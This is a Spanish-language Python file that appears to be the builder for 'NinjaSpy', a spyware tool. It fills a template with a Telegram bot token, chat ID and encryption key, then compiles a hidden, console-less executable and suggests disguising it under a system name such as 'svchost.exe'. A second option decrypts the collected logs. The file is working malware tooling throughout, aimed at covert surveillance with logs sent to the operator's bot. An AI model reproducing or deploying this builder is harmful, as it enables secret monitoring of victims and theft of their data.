
import os
import subprocess
from cryptography.fernet import Fernet

banner = """
888888ba  oo          oo          .d88888b                     
88    `8b                         88.    "'                    
88     88 dP 88d888b. dP .d8888b. `Y88888b.  88d888b. dP    dP 
88     88 88 88'  `88 88 88'  `88       `8b  88'  `88 88    88 
88     88 88 88    88 88 88.  .88 d8'   .8P  88.  .88 88.  .88 
dP     dP dP dP    dP 88 `88888P8  Y88888P   88Y888P' `8888P88 
oooooooooooooooooooooo88~ooooooooooooooooooo~88~ooooooo~~~~.88~
                      dP                     dP        d8888P  
"""

def generar_codigo(token, chat_id, exe_nombre="NinjaSpy.exe"):
    key = Fernet.generate_key().decode()
    with open("plantilla.py", "r", encoding="utf-8") as f:
        code = f.read()

    code = code.replace("__TOKEN__", f'"{token}"')
    code = code.replace("__CHAT_ID__", f'"{chat_id}"')
    code = code.replace("__FERNET_KEY__", f'"{key}"')
    code = code.replace('log.txt', f'{exe_nombre.replace(".exe", ".log")}')
    code = code.replace('log.enc', f'{exe_nombre.replace(".exe", ".enc")}')

    with open("NinjaSpy.py", "w", encoding="utf-8") as f:
        f.write(code)

    print("\n🔐 CLAVE DE CIFRADO (guárdala para desencriptar los logs):")
    print(key, "\n")

    return key

def compilar_exe(exe_nombre):
    print("[*] Compilando ejecutable...")
    subprocess.call([
        "venv\\Scripts\\python.exe", "-m", "PyInstaller",
        "--noconsole", "--onefile", f"--name={exe_nombre.replace('.exe','')}",
        "NinjaSpy.py"
    ])
    print(f"[+] Ejecutable generado: ./dist/{exe_nombre}")


def desencriptar_archivo():
    from cryptography.fernet import Fernet
    enc_file = input("📂 Ruta del archivo encriptado (.enc): ").strip()
    clave = input("🔑 Ingresa la clave Fernet (desde builder): ").strip()
    out_file = input("💾 Nombre para guardar el archivo desencriptado (ej: log.txt): ").strip()

    try:
        with open(enc_file, "rb") as f:
            data = f.read()
        fernet = Fernet(clave.encode())
        decrypted = fernet.decrypt(data)
        with open(out_file, "wb") as f:
            f.write(decrypted)
        print(f"✅ Log desencriptado exitosamente en: {out_file}")
    except Exception as e:
        print("❌ Error desencriptando:", e)

def main():
    print(banner)
    print("🛠️  Generador NinjaSpy Profesional")

    print("[1] Crear y compilar ejecutable")
    print("[2] Desencriptar archivo .enc")
    opcion = input("\nSelecciona una opción: ")

    if opcion == "1":
        token = input("🔑 TOKEN del bot: ").strip().replace('"', '')
        chat_id = input("🆔 Chat ID: ").strip().replace('"', '')
        exe_nombre = input("🧱 Nombre del ejecutable (ej: svchost.exe): ").strip()
        if not exe_nombre.endswith(".exe"):
            exe_nombre += ".exe"

        key = generar_codigo(token, chat_id, exe_nombre)
        compilar_exe(exe_nombre)

    elif opcion == "2":
        desencriptar_archivo()

    else:
        print("❌ Opción no válida.")

if __name__ == "__main__":
    main()
